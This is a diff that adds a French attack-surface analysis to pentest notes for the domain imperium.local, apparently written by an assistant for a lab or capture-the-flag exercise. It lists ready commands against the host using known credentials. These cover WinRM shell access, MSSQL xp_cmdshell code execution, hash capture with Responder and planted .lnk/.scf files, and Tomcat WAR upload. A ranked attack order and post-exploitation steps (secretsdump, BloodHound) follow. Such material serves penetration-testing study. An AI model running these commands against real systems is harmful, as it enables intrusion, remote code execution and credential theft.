@@ -474,3 +474,133 @@ certipy auth -pfx administrator.pfx -dc-ip IP
 ---
 
 _Fiche générée le 2026-05-07 — contexte : pentest imperium.local_
+
+
+
+## Analyse de la surface d'attaque
+
+Tu as pas mal de vecteurs intéressants ici. Voici une analyse structurée.
+
+### Ce que tu as déjà
+
+- **Credentials valides** : `FEYDRAUTHA.HARKONNEN:schrauth101`
+- **Droits SMB** : READ/WRITE sur `Guild Spaceship`, READ sur `IPC$`
+- **Domain** : `imperium.local`
+
+---
+
+### Vecteurs d'attaque prioritaires
+
+#### 1. 🔴 WinRM (5985/5986) — Le plus direct
+
+Tu as des creds valides, teste l'accès shell immédiatement :
+
+bash
+
+```bash
+evil-winrm -i 10.2.62.237 -u FEYDRAUTHA.HARKONNEN -p schrauth101
+```
+
+Si ça marche, c'est game over sur cette machine.
+
+---
+
+#### 2. 🔴 MSSQL (1433) — Accès DB + potentiel RCE
+
+bash
+
+```bash
+impacket-mssqlclient imperium.local/FEYDRAUTHA.HARKONNEN:schrauth101@10.2.62.237 -windows-auth
+```
+
+Une fois dedans :
+
+sql
+
+```sql
+-- Vérifier si xp_cmdshell est dispo
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+```
+
+Si le compte SQL tourne en `NT AUTHORITY\SYSTEM` ou avec privs élevés → RCE directe.
+
+---
+
+#### 3. 🟡 SMB READ/WRITE sur "Guild Spaceship"
+
+Tu peux écrire sur le share → plusieurs angles :
+
+bash
+
+```bash
+# Monter le share et explorer
+smbclient //10.2.62.237/Guild\ Spaceship -U 'imperium.local/FEYDRAUTHA.HARKONNEN%schrauth101'
+
+# Chercher des fichiers sensibles (configs, creds, scripts)
+smbmap -H 10.2.62.237 -u FEYDRAUTHA.HARKONNEN -p schrauth101 -R "Guild Spaceship"
+```
+
+Avec le droit **WRITE**, tu peux poser un fichier `.lnk` ou `.scf` pour capturer des hashes NTLMv2 si d'autres users accèdent au share :
+
+bash
+
+```bash
+# Lancer Responder en écoute
+responder -I eth0 -v
+
+# Déposer un fichier piégé via ntlm_theft ou manuellement
+```
+
+---
+
+#### 4. 🟡 RDP (3389)
+
+bash
+
+```bash
+xfreerdp /u:FEYDRAUTHA.HARKONNEN /p:schrauth101 /v:10.2.62.237
+```
+
+Utile si WinRM est bloqué.
+
+---
+
+#### 5. 🟠 Apache Tomcat (5000) + AJP (8009)
+
+AJP path traversal déjà testé (Ghostcat / CVE-2020-1938). Même si rien d'intéressant dans les fichiers, vérifie si le manager Tomcat est accessible :
+
+```
+http://10.2.62.237:5000/manager/html
+```
+
+Credentials par défaut (`tomcat:tomcat`, `admin:admin`) ou réutilisation des creds du domaine → upload WAR = RCE.
+
+---
+
+### Ordre d'attaque recommandé
+
+```
+1. evil-winrm (WinRM)          → shell direct si autorisé
+2. mssqlclient (xp_cmdshell)   → RCE via SQL
+3. Tomcat manager              → upload WAR
+4. SMB write + Responder       → capture hash → crack/relay
+5. RDP                         → fallback interactif
+```
+
+---
+
+### Post-exploitation si tu obtiens un shell
+
+bash
+
+```bash
+# Depuis impacket ou evil-winrm
+secretsdump.py imperium.local/FEYDRAUTHA.HARKONNEN:schrauth101@10.2.62.237
+
+# Enumération AD
+bloodhound-python -u FEYDRAUTHA.HARKONNEN -p schrauth101 -d imperium.local -ns 10.2.62.237 -c all
+```
+
+-- 1. Vérifier tes privilèges SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin'); -- 2. Si sysadmin = 1, activer xp_cmdshell EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- 3. RCE EXEC xp_cmdshell 'whoami';
